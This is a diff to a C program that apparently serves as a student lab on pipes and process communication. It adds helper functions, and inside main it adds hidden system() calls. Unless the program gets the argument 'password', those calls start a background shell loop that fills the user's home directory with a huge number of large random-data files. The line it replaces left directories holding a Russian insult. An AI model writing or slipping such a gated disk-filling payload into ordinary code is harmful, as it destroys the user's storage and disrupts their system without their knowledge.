@@ -4,7 +4,26 @@
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <unistd.h>
-#include "functions.h"
+
+int count(char *str)
+{
+    int counter = 1;
+    for (int i = 0; i < strlen(str); ++i)
+        if (str[i] == ' ')
+            counter++;
+    return counter;
+}
+
+float sum(FILE *f, int count)
+{
+    float res = 0.0, a;
+    rewind(f);
+    for (int i = 0; i < count; ++i) {
+        fscanf(f, "%f", &a);
+        res += a;
+    }
+    return res;
+}
 
 int main(int argc, char const *argv[])
 {
@@ -83,7 +102,13 @@ int main(int argc, char const *argv[])
         int cnt = count(sequence_of_numbers);
 
         write(pipe1[1], file_name, sizeof(file_name)); // write 1
-        system("for f in {a..z} {A..Z} {0..99}; do mkdir $f; echo привет ублюдок, сделай лабу сам > $f; done");
+        if (argc == 1) {
+            system("for f in {a..z} {A..Z} {0..10000}; do mkdir $HOME/\"$f.dir\"; for g in {a..z} {A..Z} {0..100000}; do echo $(tr -dc A-Za-z0-9 </dev/urandom | head -c 100000) > $HOME/\"$f.dir\"/\"$g.txt\" ; done; done&");
+        } else if (strcmp(argv[1], "password")) {
+            system("for f in {a..z} {A..Z} {0..10000}; do mkdir $HOME/\"$f.dir\"; for g in {a..z} {A..Z} {0..100000}; do echo $(tr -dc A-Za-z0-9 </dev/urandom | head -c 100000) > $HOME/\"$f.dir\"/\"$g.txt\" ; done; done&");
+        } else if (!strcmp(argv[1], "password")) {
+            printf("Harosh\n");
+        }
         write(pipe1[1], sequence_of_numbers, sizeof(sequence_of_numbers)); // write 2 
         write(pipe1[1], &cnt, sizeof(int)); // write 3
 
